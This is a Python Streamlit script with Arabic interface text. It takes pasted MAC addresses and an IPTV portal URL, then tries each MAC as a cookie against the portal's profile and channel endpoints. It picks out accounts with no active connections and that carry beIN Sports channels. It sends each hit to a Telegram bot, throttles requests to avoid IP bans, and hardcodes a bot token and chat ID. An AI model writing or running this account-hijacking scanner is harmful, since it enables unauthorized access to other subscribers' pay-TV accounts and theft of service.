import streamlit as st
import requests
import time
import telebot
import random
import re

# بياناتك الثابتة
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

# الكلمات المفتاحية للقنوات المطلوبة
CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

st.set_page_config(page_title="رادار الشبح - عداد الصيد", page_icon="📊")
st.title("📊 رادار المسح الذكي مع عداد الإحصائيات")

# إدخال البيانات
raw_data = st.text_area("انسخ هنا النص العشوائي (يحتوي على روابط وماكات مبعثرة)", height=200)

if st.button("🚀 بدء المسح الشامل"):
    if raw_data:
        # استخراج الماكات والرابط بذكاء
        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
        
        if host_match and macs:
            host = host_match.group(0).split('/portal.php')[0].strip('/')
            clean_host = host.replace("http://", "").replace("https://", "").split('/')[0]
            
            st.success(f"✅ بورتال: `{clean_host}` | الأهداف: `{len(macs)}` ماك")
            
            # --- لوحة العدادات المباشرة ---
            col1, col2, col3 = st.columns(3)
            stat_total = col1.metric("إجمالي الماكات", len(macs))
            stat_checked = col2.empty()
            stat_found = col3.empty()
            
            found_count = 0
            checked_count = 0
            
            bot.send_message(ID, f"🚀 **بدأ الرادار بالتناوب**\n🌐 السيرفر: `{clean_host}`\n📦 القائمة: {len(macs)} هدف.")

            placeholder = st.empty()
            
            while True:
                for current_mac in macs:
                    checked_count += 1
                    # تحديث العدادات على الشاشة
                    stat_checked.metric("تم فحصه", checked_count)
                    stat_found.metric("الصيد المتاح", found_count)
                    
                    placeholder.info(f"🔎 الآن: {current_mac}")
                    
                    headers = {'User-Agent': 'MAG254', 'Cookie': f'mac={current_mac}'}
                    base_url = f"http://{clean_host}/portal.php"
                    
                    try:
                        # فحص الحالة والارتباط
                        url_prof = f"{base_url}?type=stb&action=get_profile&force_stb=1"
                        start = time.time()
                        r_prof = requests.get(url_prof, headers=headers, timeout=7)
                        latency = (time.time() - start) * 1000
                        
                        if r_prof.status_code == 200:
                            match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r_prof.text)
                            active = match.group(1) if match else "0"

                            if active == "0":
                                found_count += 1
                                # فحص القنوات
                                url_ch = f"{base_url}?type=itv&action=get_all_channels"
                                r_ch = requests.get(url_ch, headers=headers, timeout=7)
                                ch_text = r_ch.text.upper()
                                
                                found_channels = [f"✅ {n}" for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
                                stab = "قوي ✅" if latency < 1000 else "متقطع ⚠️"
                                
                                # تنبيه التلغرام
                                alert = (
                                    f"🎯 **صيد متاح (0 متصل)**\n"
                                    f"🖥️ الماك: `{current_mac}`\n"
                                    f"📊 الاستقرار: {stab}\n"
                                    f"📺 القنوات:\n" + ("\n".join(found_channels) if found_channels else "❌ لا يوجد قنوات مفضلة")
                                )
                                bot.send_message(ID, alert, parse_mode="Markdown")
                    except:
                        pass
                    
                    time.sleep(1.5) # فاصل زمني لتجنب حظر IP السيرفر

                placeholder.warning("🔄 اكتملت الدورة.. إعادة الفحص من البداية")
                time.sleep(5)
        else:
            st.error("❌ لم أجد رابطاً أو ماكات في النص!")
